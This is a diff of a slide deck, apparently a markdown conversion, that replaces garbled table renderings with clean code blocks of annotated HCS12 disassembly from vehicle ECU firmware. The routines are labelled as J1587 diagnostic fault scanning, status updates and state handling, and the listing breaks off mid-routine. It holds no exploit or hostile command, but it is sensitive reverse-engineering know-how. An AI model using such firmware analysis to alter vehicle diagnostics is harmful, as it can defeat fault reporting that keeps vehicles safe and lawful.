**E9844C:** 2023 **bra** loc_E98471 _; Branch always_ **E9844E:** 6980 **clr** 2+var_2, **sp** _; Clear memory_ **E98450:** E680 **ldab** 2+var_2, **sp** _; Load B_ **E98452:** B796 **exg** b,y _; Exchange register to register_ **E98454:** 180B7E0010 **movb** #0x7E,MMC_GPAGE _; '~'; Move byte (8-bit)_ **E98459:** 18E6EA3DAD **gldab** 0x3DAD,y **E9845E:** F12950 **cmpb** word_294F+1 _; Compare B to memory_ **E98461:** 2606 **bne** loc_E98469 _; Branch if not equal_ **E98463:** C601 **ldab** #1 _; Load B_ **E98465:** 6B81 **stab** 2+var_1, **sp** _; Store B_ **E98467:** 2008 **bra** loc_E98471 _; Branch always_ **E98469:** 6280 **inc** 2+var_2, **sp** _; Increment memory_ **E9846B:** E680 **ldab** 2+var_2, **sp** _; Load B_ **E9846D:** C103 **cmpb** #3 _; Compare B to memory_ **E9846F:** 25DF **bcs** loc_E98450 _; Branch if carry set_ **E98471:** E681 **ldab** 2+var_1, **sp** _; Load B_ **E98473:** 31 **puly** _; Pull Y_ **E98474:** 0A **rtc** _; Return from call_
-
-62
+```
+E98420: 3B            pshd; Push D
+E98421: 6981          clr     2+var_1,sp; Clear memory
+E98423: F6294F        ldab    word_294F; Load B
+E98426: 040106        dbeq    b,loc_E9842F; Decrement counter and branch if = 0
+E98429: C002          subb    #2; Subtract memory from B
+E9842B: 2721          beq     loc_E9844E; Branch if equal
+E9842D: 2042          bra     loc_E98471; Branch always
+E9842F: 6980          clr     2+var_2,sp; Clear memory
+E98431: E680          ldab    2+var_2,sp; Load B
+E98433: B796          exg     b,y; Exchange register to register
+E98435: 180B7E0010    movb    #0x7E,MMC_GPAGE ; '~'; Move byte (8-bit)
+E9843A: 18E6EA3DA6    gldab   0x3DA6,y
+E9843F: F12950        cmpb    word_294F+1; Compare B to memory
+E98442: 271F          beq     loc_E98463; Branch if equal
+E98444: 6280          inc     2+var_2,sp; Increment memory
+E98446: E680          ldab    2+var_2,sp; Load B
+E98448: C107          cmpb    #7; Compare B to memory
+E9844A: 25E5          bcs     loc_E98431; Branch if carry set
+E9844C: 2023          bra     loc_E98471; Branch always
+E9844E: 6980          clr     2+var_2,sp; Clear memory
+E98450: E680          ldab    2+var_2,sp; Load B
+E98452: B796          exg     b,y; Exchange register to register
+E98454: 180B7E0010    movb    #0x7E,MMC_GPAGE ; '~'; Move byte (8-bit)
+E98459: 18E6EA3DAD    gldab   0x3DAD,y
+E9845E: F12950        cmpb    word_294F+1; Compare B to memory
+E98461: 2606          bne     loc_E98469; Branch if not equal
+E98463: C601          ldab    #1; Load B
+E98465: 6B81          stab    2+var_1,sp; Store B
+E98467: 2008          bra     loc_E98471; Branch always
+E98469: 6280          inc     2+var_2,sp; Increment memory
+E9846B: E680          ldab    2+var_2,sp; Load B
+E9846D: C103          cmpb    #3; Compare B to memory
+E9846F: 25DF          bcs     loc_E98450; Branch if carry set
+E98471: E681          ldab    2+var_1,sp; Load B
+E98473: 31            puly; Pull Y
+E98474: 0A            rtc; Return from call
+```
 
 ## Slide 63
 
 #### **sub_E98475** :
 
-|**E98475:**
-**E98478:**|CC0141
- 4A8936F1|**ldd**
-**call**|#0x141_; Load D_
-coreF18936,#0xF1_; Call subroutine in expanded memory_|
-|---|---|---|---|
-|**E9847C: **|**D7**|tstb_; _|_
- _Test B for zero or minus_|
-|**E9847D:**|267C|**bne**|loc_E984FB_; Branch if not equal_|
-|**E9847F:**|1F354A022D|**brclr**|byte_354A,#2,loc_E984B1_; Branch if selected bits clear_|
-|**E98484:**|F62631|**ldab**|byte_2631_; Load B_|
-|**E98487:**|2621|**bne**|loc_E984AA_; Branch if not equal_|
-|**E98489:**|1872111B|**incw**|word_FD111B|
-|**E9848D:**|FC111B|**ldd**|word_FD111B_; Load D_|
-|**E98490:**|8C09C4|**cpd**|#0x9C4_; Compare D to memory (16-bit)_|
-|**E98493:**|261C|**bne**|loc_E984B1_; Branch if not equal_|
-|**E98495:**|87|clra_; _|_Clear A_|
-|**E98496:**|C7|clrb_; _|_Clear B_|
-|**E98497:**|3B|**pshd**_; _|_Push D_|
-|**E98498:**|52|incb_; _|_Increment B_|
-|**E98499:**|37|**pshb**_; _|_Push B_|
-|**E9849A:**|CC0141|**ldd**|#0x141_; Load D_|
-|**E9849D:**|4A92E8EF|**call**|sub_EF92E8,#0xEF_; Call subroutine in expanded memory_|
-|**E984A1:**|1B83|**leas**|3,**sp**_; Load effective address into SP_|
-|**E984A3:**|C601|**ldab**|#1_; Load B_|
-|**E984A5:**|7B295E|**stab**|byte_295E_; Store B_|
-|**E984A8:**|2007|**bra**|loc_E984B1_; Branch always_|
-|**E984AA:**|1879111B|**clrw**|word_FD111B|
-|**E984AE:**|79295E|**clr**|byte_295E_; Clear memory_|
-|**E984B1:**|1F354A0145|**brclr**|byte_354A,#1,loc_E984FB_; Branch if selected bits clear_|
-|**E984B6:**|1E19FC2040|**brset**|byte_FD19FC,#0x20,loc_E984FB _; ' '; Branch if selected bits set_|
-|**E984BB:**|FC5BD0|**ldd**|word_5BD0_; Load D_|
-|**E984BE:**|8C012C|**cpd**|#0x12C_; Compare D to memory (16-bit)_|
-|**E984C1:**|2538|**bcs**|loc_E984FB_; Branch if carry set_|
-|**E984C3:**|CC0002|**ldd**|#2_; Load D_|
-|**E984C6:**|4AB029F2|**call**|core_F2B029,#0xF2_; Call subroutine in expanded memory_|
-|**E984CA:**|8C0348|**cpd**|#0x348_; Compare D to memory (16-bit)_|
-|**E984CD:**|251F|**bcs**|loc_E984EE_; Branch if carry set_|
-|**E984CF:**|72111A|**inc**|byte_FD111A_; Increment memory_|
-|**E984D2:**|F6111A|**ldab**|byte_FD111A_; Load B_|
-|**E984D5:**|C10A|**cmpb**|#0xA_; Compare B to memory_|
-|**E984D7:**|2622|**bne**|loc_E984FB_; Branch if not equal_|
-|**E984D9:**|87|clra_; _|_Clear A_|
-|**E984DA:**|C7|clrb_; _|_Clear B_|
-|**E984DB:**|3B|**pshd**_; _|_Push D_|
-|**E984DC:**|52|incb_; _|_Increment B_|
-|**E984DD:**|37|**pshb**_; _|_Push B_|
-|**E984DE:**|CC0141|**ldd**|#0x141_; Load D_|
-|**E984E1:**|4A92E8EF|**call**|sub_EF92E8,#0xEF_; Call subroutine in expanded memory_|
-|**E984E5:**|1B83|**leas**|3,**sp**_; Load effective address into SP_|
-|**E984E7:**|C601|**ldab**|#1_; Load B_|
-|**E984E9:**|7B295F|**stab**|byte_295F_; Store B_|
-|**E984EC:**|200D|**bra**|loc_E984FB_; Branch always_|
-|**E984EE:**|F7111A|**tst**|byteFD111A_; Test memory for zero or minus_|
-|**E984F1:**|2705|**beq**|_
-locE984F8_;Branchifequal_|
-|
-**E984F3:**|
- 73111A|**dec**|_
-byteFD111A_; Decrement memory_|
-|**E984F6:**|2003|**bra**|_
-loc_E984FB_; Branch always_|
-|**E984F8:**|79295F|**clr**|byte295F_;Clearmemory_|
-|
-**E984FB:**|
- CC0141|**ldd**|_
-#0x141_; Load D_|
-|**E984FE:**|4A94A7EF|**call**|core_EF94A7,#0xEF_; Call subroutine in expanded memory_|
-|**E98502:**|1F354A085B|**brclr**|byte_354A,#8,locret_E98562_; Branch if selected bits clear_|
-|**E98507:**|CC0140|**ldd**|#0x140_; Load D_|
-|**E9850A:**|4A8936F1|**call**|core_F18936,#0xF1_; Call subroutine in expanded memory_|
-
-63
+```
+E98475: CC0141        ldd     #0x141; Load D
+E98478: 4A8936F1      call    core_F18936,#0xF1; Call subroutine in expanded memory
+E9847C: D7            tstb; Test B for zero or minus
+E9847D: 267C          bne     loc_E984FB; Branch if not equal
+E9847F: 1F354A022D    brclr   byte_354A,#2,loc_E984B1; Branch if selected bits clear
+E98484: F62631        ldab    byte_2631; Load B
+E98487: 2621          bne     loc_E984AA; Branch if not equal
+E98489: 1872111B      incw    word_FD111B
+E9848D: FC111B        ldd     word_FD111B; Load D
+E98490: 8C09C4        cpd     #0x9C4; Compare D to memory (16-bit)
+E98493: 261C          bne     loc_E984B1; Branch if not equal
+E98495: 87            clra; Clear A
+E98496: C7            clrb; Clear B
+E98497: 3B            pshd; Push D
+E98498: 52            incb; Increment B
+E98499: 37            pshb; Push B
+E9849A: CC0141        ldd     #0x141; Load D
+E9849D: 4A92E8EF      call    sub_EF92E8,#0xEF; Call subroutine in expanded memory
+E984A1: 1B83          leas    3,sp; Load effective address into SP
+E984A3: C601          ldab    #1; Load B
+E984A5: 7B295E        stab    byte_295E; Store B
+E984A8: 2007          bra     loc_E984B1; Branch always
+E984AA: 1879111B      clrw    word_FD111B
+E984AE: 79295E        clr     byte_295E; Clear memory
+E984B1: 1F354A0145    brclr   byte_354A,#1,loc_E984FB; Branch if selected bits clear
+E984B6: 1E19FC2040    brset   byte_FD19FC,#0x20,loc_E984FB ; ' '; Branch if selected bits set
+E984BB: FC5BD0        ldd     word_5BD0; Load D
+E984BE: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E984C1: 2538          bcs     loc_E984FB; Branch if carry set
+E984C3: CC0002        ldd     #2; Load D
+E984C6: 4AB029F2      call    core_F2B029,#0xF2; Call subroutine in expanded memory
+E984CA: 8C0348        cpd     #0x348; Compare D to memory (16-bit)
+E984CD: 251F          bcs     loc_E984EE; Branch if carry set
+E984CF: 72111A        inc     byte_FD111A; Increment memory
+E984D2: F6111A        ldab    byte_FD111A; Load B
+E984D5: C10A          cmpb    #0xA; Compare B to memory
+E984D7: 2622          bne     loc_E984FB; Branch if not equal
+E984D9: 87            clra; Clear A
+E984DA: C7            clrb; Clear B
+E984DB: 3B            pshd; Push D
+E984DC: 52            incb; Increment B
+E984DD: 37            pshb; Push B
+E984DE: CC0141        ldd     #0x141; Load D
+E984E1: 4A92E8EF      call    sub_EF92E8,#0xEF; Call subroutine in expanded memory
+E984E5: 1B83          leas    3,sp; Load effective address into SP
+E984E7: C601          ldab    #1; Load B
+E984E9: 7B295F        stab    byte_295F; Store B
+E984EC: 200D          bra     loc_E984FB; Branch always
+E984EE: F7111A        tst     byte_FD111A; Test memory for zero or minus
+E984F1: 2705          beq     loc_E984F8; Branch if equal
+E984F3: 73111A        dec     byte_FD111A; Decrement memory
+E984F6: 2003          bra     loc_E984FB; Branch always
+E984F8: 79295F        clr     byte_295F; Clear memory
+E984FB: CC0141        ldd     #0x141; Load D
+E984FE: 4A94A7EF      call    core_EF94A7,#0xEF; Call subroutine in expanded memory
+E98502: 1F354A085B    brclr   byte_354A,#8,locret_E98562; Branch if selected bits clear
+E98507: CC0140        ldd     #0x140; Load D
+E9850A: 4A8936F1      call    core_F18936,#0xF1; Call subroutine in expanded memory
+```
 
 ## Slide 64
 
-**E9850E:** 04614A **tbne** b,loc_E9855B _; Test counter and branch if != 0_ **E98511:** 1E354A0145 **brset** byte_354A,#1,loc_E9855B _; Branch if selected bits set_ **E98516:** 1E19FC2040 **brset** byte_FD19FC,#0x20,loc_E9855B _; ' '; Branch if selected bits set_ **E9851B:** FC5BD0 **ldd** word_5BD0 _; Load D_ **E9851E:** 8C012C **cpd** #0x12C _; Compare D to memory (16-bit)_ **E98521:** 2538 **bcs** loc_E9855B _; Branch if carry set_ **E98523:** CC0002 **ldd** #2 _; Load D_ **E98526:** 4AB029F2 **call** core_F2B029,#0xF2 _; Call subroutine in expanded memory_ **E9852A:** 8C0348 **cpd** #0x348 _; Compare D to memory (16-bit)_ **E9852D:** 241F **bcc** loc_E9854E _; Branch if carry clear_ **E9852F:** 72111D **inc** byte_FD111D _; Increment memory_ **E98532:** F6111D **ldab** byte_FD111D _; Load B_ **E98535:** C10A **cmpb** #0xA _; Compare B to memory_ **E98537:** 2622 **bne** loc_E9855B _; Branch if not equal_ **E98539:** 87 clra _; Clear A_ **E9853A:** C7 clrb _; Clear B_ **E9853B:** 3B **pshd** _; Push D_ **E9853C:** 52 incb _; Increment B_ **E9853D:** 37 **pshb** _; Push B_ **E9853E:** CC0140 **ldd** #0x140 _; Load D_ **E98541:** 4A92E8EF **call** sub_EF92E8,#0xEF _; Call subroutine in expanded memory_ **E98545:** 1B83 **leas** 3, **sp** _; Load effective address into SP_ **E98547:** C601 **ldab** #1 _; Load B_ **E98549:** 7B2960 **stab** byte_2960 _; Store B_ **E9854C:** 200D **bra** loc_E9855B _; Branch always_ **E9854E:** F7111D **tst** byte_FD111D _; Test memory for zero or minus_ **E98551:** 2705 **beq** loc_E98558 _; Branch if equal_ **E98553:** 73111D **dec** byte_FD111D _; Decrement memory_ **E98556:** 2003 **bra** loc_E9855B _; Branch always_ **E98558:** 792960 **clr** byte_2960 _; Clear memory_ **E9855B:** CC0140 **ldd** #0x140 _; Load D_ **E9855E:** 4A94A7EF **call** core_EF94A7,#0xEF _; Call subroutine in expanded memory_ **E98562:** 0A **rtc** _; Return from call_
+```
+E9850E: 04614A        tbne    b,loc_E9855B; Test counter and branch if != 0
+E98511: 1E354A0145    brset   byte_354A,#1,loc_E9855B; Branch if selected bits set
+E98516: 1E19FC2040    brset   byte_FD19FC,#0x20,loc_E9855B ; ' '; Branch if selected bits set
+E9851B: FC5BD0        ldd     word_5BD0; Load D
+E9851E: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E98521: 2538          bcs     loc_E9855B; Branch if carry set
+E98523: CC0002        ldd     #2; Load D
+E98526: 4AB029F2      call    core_F2B029,#0xF2; Call subroutine in expanded memory
+E9852A: 8C0348        cpd     #0x348; Compare D to memory (16-bit)
+E9852D: 241F          bcc     loc_E9854E; Branch if carry clear
+E9852F: 72111D        inc     byte_FD111D; Increment memory
+E98532: F6111D        ldab    byte_FD111D; Load B
+E98535: C10A          cmpb    #0xA; Compare B to memory
+E98537: 2622          bne     loc_E9855B; Branch if not equal
+E98539: 87            clra; Clear A
+E9853A: C7            clrb; Clear B
+E9853B: 3B            pshd; Push D
+E9853C: 52            incb; Increment B
+E9853D: 37            pshb; Push B
+E9853E: CC0140        ldd     #0x140; Load D
+E98541: 4A92E8EF      call    sub_EF92E8,#0xEF; Call subroutine in expanded memory
+E98545: 1B83          leas    3,sp; Load effective address into SP
+E98547: C601          ldab    #1; Load B
+E98549: 7B2960        stab    byte_2960; Store B
+E9854C: 200D          bra     loc_E9855B; Branch always
+E9854E: F7111D        tst     byte_FD111D; Test memory for zero or minus
+E98551: 2705          beq     loc_E98558; Branch if equal
+E98553: 73111D        dec     byte_FD111D; Decrement memory
+E98556: 2003          bra     loc_E9855B; Branch always
+E98558: 792960        clr     byte_2960; Clear memory
+E9855B: CC0140        ldd     #0x140; Load D
+E9855E: 4A94A7EF      call    core_EF94A7,#0xEF; Call subroutine in expanded memory
+E98562: 0A            rtc; Return from call
+```
 
 #### **sub_E98563** :
 
-**E98563:** 37 **pshb** _; Push B_ **E98564:** 79295D **clr** byte_295D _; Clear memory_ **E98567:** 6980 **clr** 1+var_1, **sp** _; Clear memory_ **E98569:** FDCEF1 **ldy** word_CEF1 _; Load Y_ **E9856C:** E680 **ldab** 1+var_1, **sp** _; Load B_ **E9856E:** 861B **ldaa** #0x1B _; Load A_ **E98570:** 12 **mul** _; 8 by 8 multiply (unsigned)_ **E98571:** 19EE **leay** d,y _; Load effective address into Y_ **E98573:** EC48 **ldd** 8,y _; Load D_ **E98575:** 8C008C **cpd** #0x8C _; Compare D to memory (16-bit)_ **E98578:** 2F05 **ble** loc_E9857F _; Branch if less than or equal_ **E9857A:** C601 **ldab** #1 _; Load B_ **E9857C:** 7B295D **stab** byte_295D _; Store B_ **E9857F:** 6280 **inc** 1+var_1, **sp** _; Increment memory_ **E98581:** E680 **ldab** 1+var_1, **sp** _; Load B_ **E98583:** C104 **cmpb** #4 _; Compare B to memory_ **E98585:** 25E2 **bcs** loc_E98569 _; Branch if carry set_ **E98587:** 1B81 **ins** _; Increment SP_ **E98589:** 0A **rtc** _; Return from call_
-
-64
+```
+E98563: 37            pshb; Push B
+E98564: 79295D        clr     byte_295D; Clear memory
+E98567: 6980          clr     1+var_1,sp; Clear memory
+E98569: FDCEF1        ldy     word_CEF1; Load Y
+E9856C: E680          ldab    1+var_1,sp; Load B
+E9856E: 861B          ldaa    #0x1B; Load A
+E98570: 12            mul; 8 by 8 multiply (unsigned)
+E98571: 19EE          leay    d,y; Load effective address into Y
+E98573: EC48          ldd     8,y; Load D
+E98575: 8C008C        cpd     #0x8C; Compare D to memory (16-bit)
+E98578: 2F05          ble     loc_E9857F; Branch if less than or equal
+E9857A: C601          ldab    #1; Load B
+E9857C: 7B295D        stab    byte_295D; Store B
+E9857F: 6280          inc     1+var_1,sp; Increment memory
+E98581: E680          ldab    1+var_1,sp; Load B
+E98583: C104          cmpb    #4; Compare B to memory
+E98585: 25E2          bcs     loc_E98569; Branch if carry set
+E98587: 1B81          ins; Increment SP
+E98589: 0A            rtc; Return from call
+```
 
 ## Slide 65
 
 #### **sub_E9858A** :
 
-|**E9858A:**|F62962|**ldab**|byte_2962_; Load B_|
-|---|---|---|---|
-|**E9858D:**|2609|**bne**|loc_E98598_; Branch if not equal_|
-|**E9858F:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E98593:**|C601|**ldab**|#1_; Load B_|
-|**E98595:**|7B2962|**stab**|byte_2962_; Store B_|
-|**E98598:**|4A8563E9|**call**|gone_J1587_Diag_Scan_Fault_Table_E98563,#0xE9_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E9859C:**|4A8475E9|**call**|gone_J1587_Diag_Update_Global_Status_E98475,#0xE9_; Call subroutine_|
-|_in _
-↪|_expanded memory_|||
-|**E985A0:**|F6295D|**ldab**|byte_295D_; Load B_|
-|**E985A3:**|53|decb_; _|_Decrement B_|
-|**E985A4:**|2717|**beq**|loc_E985BD_; Branch if equal_|
-|**E985A6:**|F6295F|**ldab**|byte_295F_; Load B_|
-|**E985A9:**|04010C|**dbeq**|b,loc_E985B8_; Decrement counter and branch if = 0_|
-|**E985AC:**|F6295E|**ldab**|byte_295E_; Load B_|
-|**E985AF:**|040106|**dbeq**|b,loc_E985B8_; Decrement counter and branch if = 0_|
-|**E985B2:**|F62960|**ldab**|byte_2960_; Load B_|
-|**E985B5:**|04210A|**dbne**|b,loc_E985C2_; Decrement counter and branch if != 0_|
-|**E985B8:**|C7|clrb_; _|_Clear B_|
-|**E985B9:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E985BD:**|4A8337E9|**call**|gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9_; Call subroutine_|
-|_in _
-↪|_expanded memory_|||
-|**E985C1:**|0A|**rtc**_; _|_Return from call_|
-|**E985C2:**|4ABCBFE8|**call**|gone_J1587_Diag_Check_Healing_Conditions_E8BCBF,#0xE8_; Call_|
-|_sub_
-↪|_routine in expand_|_ed mem_|_ory_|
-|**E985C6:**|4ABD09E8|**call**|gone_J1587_Diag_Main_State_Machine_E8BD09,#0xE8_; Call subroutine_|
-|_in _
-↪|_expanded memory_|||
-|**E985CA:**|0A|**rtc**_; _|_Return from call_|
+```
+E9858A: F62962        ldab    byte_2962; Load B
+E9858D: 2609          bne     loc_E98598; Branch if not equal
+E9858F: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E98593: C601          ldab    #1; Load B
+E98595: 7B2962        stab    byte_2962; Store B
+E98598: 4A8563E9      call    gone_J1587_Diag_Scan_Fault_Table_E98563,#0xE9; Call subroutine in
+↪   expanded memory
+E9859C: 4A8475E9      call    gone_J1587_Diag_Update_Global_Status_E98475,#0xE9; Call subroutine
+↪   in expanded memory
+E985A0: F6295D        ldab    byte_295D; Load B
+E985A3: 53            decb; Decrement B
+E985A4: 2717          beq     loc_E985BD; Branch if equal
+E985A6: F6295F        ldab    byte_295F; Load B
+E985A9: 04010C        dbeq    b,loc_E985B8; Decrement counter and branch if = 0
+E985AC: F6295E        ldab    byte_295E; Load B
+E985AF: 040106        dbeq    b,loc_E985B8; Decrement counter and branch if = 0
+E985B2: F62960        ldab    byte_2960; Load B
+E985B5: 04210A        dbne    b,loc_E985C2; Decrement counter and branch if != 0
+E985B8: C7            clrb; Clear B
+E985B9: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E985BD: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E985C1: 0A            rtc; Return from call
+E985C2: 4ABCBFE8      call    gone_J1587_Diag_Check_Healing_Conditions_E8BCBF,#0xE8; Call
+↪   subroutine in expanded memory
+E985C6: 4ABD09E8      call    gone_J1587_Diag_Main_State_Machine_E8BD09,#0xE8; Call subroutine
+↪   in expanded memory
+E985CA: 0A            rtc; Return from call
+```
 
 #### **sub_E99F1A** :
 
-|**E99F1A:**|3B
-**pshd**_; _|_Push D_|
-|---|---|---|
-|**E99F1B:**|F63DED
-**ldab**|byte_3DED_; Load B_|
-|**E99F1E:**|04215B
-**dbne**|b,loc_E99F7C_; Decrement counter and branch if != 0_|
-|**E99F21:**|E6F024
-**ldab**|2+arg_20,**sp**_; Load B_|
-|**E99F24:**|042104
-**dbne**|b,loc_E99F2B_; Decrement counter and branch if != 0_|
-|**E99F27:**|C601
-**ldab**|#1_; Load B_|
-|**E99F29:**|2053
-**bra**|loc_E99F7E_; Branch always_|
-|**E99F2B:**|F63E0E
-**ldab**|byte_3E0E_; Load B_|
-|**E99F2E:**|042121
-**dbne**|b,loc_E99F52_; Decrement counter and branch if != 0_|
-|**E99F31:**|E6F028
-**ldab**|2+arg_24,**sp**_; Load B_|
-|**E99F34:**|37
-**pshb**_; _|_Push B_|
-|**E99F35:**|C7
-clrb_; _|_Clear B_|
-|**E99F36:**|37
-**pshb**_; _|_Push B_|
-|**E99F37:**|E6F024
-**ldab**|4+arg_1E,**sp**_; Load B_|
-|**E99F3A:**|37
-**pshb**_; _|_Push B_|
-|**E99F3B:**|E6F024
-**ldab**|5+arg_1D,**sp**_; Load B_|
-|**E99F3E:**|37
-**pshb**_; _|_Push B_|
-|**E99F3F:**|ECF015
-**ldd**|6+arg_D,**sp**_; Load D_|
-|**E99F42:**|3B
-**pshd**_; _|_Push D_|
-|**E99F43:**|E68B
-**ldab**|8+arg_1,**sp**_; Load B_|
-|**E99F45:**|37
-**pshb**_; _|_Push B_|
-|**E99F46:**|E6F010
-**ldab**|9+arg_5,**sp**_; Load B_|
-
-65
+```
+E99F1A: 3B            pshd; Push D
+E99F1B: F63DED        ldab    byte_3DED; Load B
+E99F1E: 04215B        dbne    b,loc_E99F7C; Decrement counter and branch if != 0
+E99F21: E6F024        ldab    2+arg_20,sp; Load B
+E99F24: 042104        dbne    b,loc_E99F2B; Decrement counter and branch if != 0
+E99F27: C601          ldab    #1; Load B
+E99F29: 2053          bra     loc_E99F7E; Branch always
+E99F2B: F63E0E        ldab    byte_3E0E; Load B
+E99F2E: 042121        dbne    b,loc_E99F52; Decrement counter and branch if != 0
+E99F31: E6F028        ldab    2+arg_24,sp; Load B
+E99F34: 37            pshb; Push B
+E99F35: C7            clrb; Clear B
+E99F36: 37            pshb; Push B
+E99F37: E6F024        ldab    4+arg_1E,sp; Load B
+E99F3A: 37            pshb; Push B
+E99F3B: E6F024        ldab    5+arg_1D,sp; Load B
+E99F3E: 37            pshb; Push B
+E99F3F: ECF015        ldd     6+arg_D,sp; Load D
+E99F42: 3B            pshd; Push D
+E99F43: E68B          ldab    8+arg_1,sp; Load B
+E99F45: 37            pshb; Push B
+E99F46: E6F010        ldab    9+arg_5,sp; Load B
+```
 
 ## Slide 66
 
-|**E99F49:**
-**E99F4A:**|37
-ECF027|**pshb**_; _
-**ldd**|_Push B_
-0xA+ar1B**s**_LoadD_|
-|---|---|---|---|
-|
-**E99F4D:**|
- 3B|**pshd**_; _|g_,**p**_;  _
- _Push D_|
-|**E99F4E:**|C60A|**ldab**|#0xA_; Load B_|
-|**E99F50:**|201E|**bra**|loc_E99F70_; Branch always_|
-|**E99F52:**|E6F028|**ldab**|0xC+arg_1A,**sp**_; Load B_|
-|**E99F55:**|37|**pshb**_; _|_Push B_|
-|**E99F56:**|C7|clrb_; _|_Clear B_|
-|**E99F57:**|37|**pshb**_; _|_Push B_|
-|**E99F58:**|E6F025|**ldab**|0xE+arg_15,**sp**_; Load B_|
-|**E99F5B:**|37|**pshb**_; _|_Push B_|
-|**E99F5C:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E99F5F:**|37|**pshb**_; _|_Push B_|
-|**E99F60:**|ECF015|**ldd**|0x10+arg_3,**sp**_; Load D_|
-|**E99F63:**|3B|**pshd**_; _|_Push D_|
-|**E99F64:**|E68C|**ldab**|0x12+var_6,**sp**_; Load B_|
-|**E99F66:**|37|**pshb**_; _|_Push B_|
-|**E99F67:**|E68F|**ldab**|0x13+var_4,**sp**_; Load B_|
-|**E99F69:**|37|**pshb**_; _|_Push B_|
-|**E99F6A:**|ECF027|**ldd**|0x14+arg_11,**sp**_; Load D_|
-|**E99F6D:**|3B|**pshd**_; _|_Push D_|
-|**E99F6E:**|C614|**ldab**|#0x14_; Load B_|
-|**E99F70:**|37|**pshb**_; _|_Push B_|
-|**E99F71:**|ECF019|**ldd**|0x17+arg_0,**sp**_; Load D_|
-|**E99F74:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E99F78:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E99F7A:**|2002|**bra**|loc_E99F7E_; Branch always_|
-|**E99F7C:**|C602|**ldab**|#2_; Load B_|
-|**E99F7E:**|7B2027|**stab**|byte_2027_; Store B_|
-|**E99F81:**|C61E|**ldab**|#0x1E_; Load B_|
-|**E99F83:**|7B2028|**stab**|byte_2028_; Store B_|
-|**E99F86:**|F63E21|**ldab**|bte3E21_LoadB_|
-|
-**E99F89:**|
- 042114|**dbne**|y;  _
-b,locE99FA0_; Decrement counter and branch if != 0_|
-|**E99F8C:**|F62029|**ldab**|_
-byte_2029_; Load B_|
-|**E99F8F:**|260A|**bne**|loc_E99F9B_; Branch if not equal_|
-|**E99F91:**|E688|**ldab**|0xC+var_4,**sp**_; Load B_|
-|**E99F93:**|042105|**dbne**|b,loc_E99F9B_; Decrement counter and branch if != 0_|
-|**E99F96:**|C614|**ldab**|#0x14_; Load B_|
-|**E99F98:**|7B201F|**stab**|byte_201F_; Store B_|
-|**E99F9B:**|C614|**ldab**|#0x14_; Load B_|
-|**E99F9D:**|7B2028|**stab**|byte_2028_; Store B_|
-|**E99FA0:**|F6201F|**ldab**|byte_201F_; Load B_|
-|**E99FA3:**|C164|**cmpb**|#0x64 _; 'd'; Compare B to memory_|
-|**E99FA5:**|2505|**bcs**|loc_E99FAC_; Branch if carry set_|
-|**E99FA7:**|79201F|**clr**|byte_201F_; Clear memory_|
-|**E99FAA:**|2004|**bra**|locE99FB0_; Branch always_|
-|**E99FAC:**|52|incb_; _|_
- _Increment B_|
-|**E99FAD:**|7B201F|**stab**|byte_201F_; Store B_|
-|**E99FB0:**|F63DF5|**ldab**|byte_3DF5_; Load B_|
-|**E99FB3:**|04210F|**dbne**|blocE99FC5_;Decrementcounterandbranchif!=0_|
-|
-**E99FB6:**|
- E689|**ldab**|,       _
-0xC+var_3,**sp**_; Load B_|
-|**E99FB8:**|04210A|**dbne**|b,loc_E99FC5_; Decrement counter and branch if != 0_|
-|**E99FBB:**|F6202A|**ldab**|byte_202A_; Load B_|
-|**E99FBE:**|2605|**bne**|locE99FC5_;Branchifnotequal_|
-|
-**E99FC0:**|
- C605|**ldab**|_
-#5_; Load B_|
-|**E99FC2:**|7B201F|**stab**|byte_201F_; Store B_|
-|**E99FC5:**|E688|**ldab**|0xC+var_4,**sp**_; Load B_|
-|**E99FC7:**|2604|**bne**|locE99FCD_;Branchifnotequal_|
-|
-**E99FC9:**|
- C6C8|**ldab**|_
-#0xC8_; Load B_|
-
-66
+```
+E99F49: 37            pshb; Push B
+E99F4A: ECF027        ldd     0xA+arg_1B,sp; Load D
+E99F4D: 3B            pshd; Push D
+E99F4E: C60A          ldab    #0xA; Load B
+E99F50: 201E          bra     loc_E99F70; Branch always
+E99F52: E6F028        ldab    0xC+arg_1A,sp; Load B
+E99F55: 37            pshb; Push B
+E99F56: C7            clrb; Clear B
+E99F57: 37            pshb; Push B
+E99F58: E6F025        ldab    0xE+arg_15,sp; Load B
+E99F5B: 37            pshb; Push B
+E99F5C: E6F024        ldab    0xF+arg_13,sp; Load B
+E99F5F: 37            pshb; Push B
+E99F60: ECF015        ldd     0x10+arg_3,sp; Load D
+E99F63: 3B            pshd; Push D
+E99F64: E68C          ldab    0x12+var_6,sp; Load B
+E99F66: 37            pshb; Push B
+E99F67: E68F          ldab    0x13+var_4,sp; Load B
+E99F69: 37            pshb; Push B
+E99F6A: ECF027        ldd     0x14+arg_11,sp; Load D
+E99F6D: 3B            pshd; Push D
+E99F6E: C614          ldab    #0x14; Load B
+E99F70: 37            pshb; Push B
+E99F71: ECF019        ldd     0x17+arg_0,sp; Load D
+E99F74: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E99F78: 1B8B          leas    0xB,sp; Load effective address into SP
+E99F7A: 2002          bra     loc_E99F7E; Branch always
+E99F7C: C602          ldab    #2; Load B
+E99F7E: 7B2027        stab    byte_2027; Store B
+E99F81: C61E          ldab    #0x1E; Load B
+E99F83: 7B2028        stab    byte_2028; Store B
+E99F86: F63E21        ldab    byte_3E21; Load B
